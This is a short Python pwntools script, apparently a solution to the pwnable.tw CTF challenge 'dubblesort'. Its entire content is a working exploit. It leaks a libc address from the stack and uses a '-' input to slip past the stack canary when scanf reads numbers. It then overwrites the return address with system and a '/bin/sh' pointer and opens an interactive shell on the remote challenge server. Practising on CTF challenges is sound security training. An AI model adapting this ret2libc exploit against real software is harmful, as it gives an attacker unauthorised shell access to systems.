from platform import architecture
from pwn import *

context(arch="i386", os="linux", log_level = "DEBUG")

p = remote('chall.pwnable.tw',10101)
#p = process('./dubblesort')

elf_libc = ELF('./libc_32.so.6')
got_plt_offset = 0x1b0000

# leak libc address
payload_1 = "A"*24
p.recv()
p.sendline(payload_1)
#r = p.recvuntil(payload_1)

r = p.recv()
libc_addr = u32(r[30:34])-0xa
libcbase_addr = libc_addr - got_plt_offset
#print hex(libcbase_addr)
#onegadget_addr =0x3a819 + libcbase_addr
sys_addr = libcbase_addr + elf_libc.symbols['system']
bin_sh_addr = libcbase_addr + next(elf_libc.search(b'/bin/sh'))

p.sendline('35')


for i in range(24):
    r = p.recv()
    p.sendline("0")

r = p.recv()
p.sendline("-")

for i in range(9):
    r = p.recv()
    p.sendline(str(sys_addr))


r = p.recv()
p.sendline(str(bin_sh_addr))

r = p.recv()

p.interactive()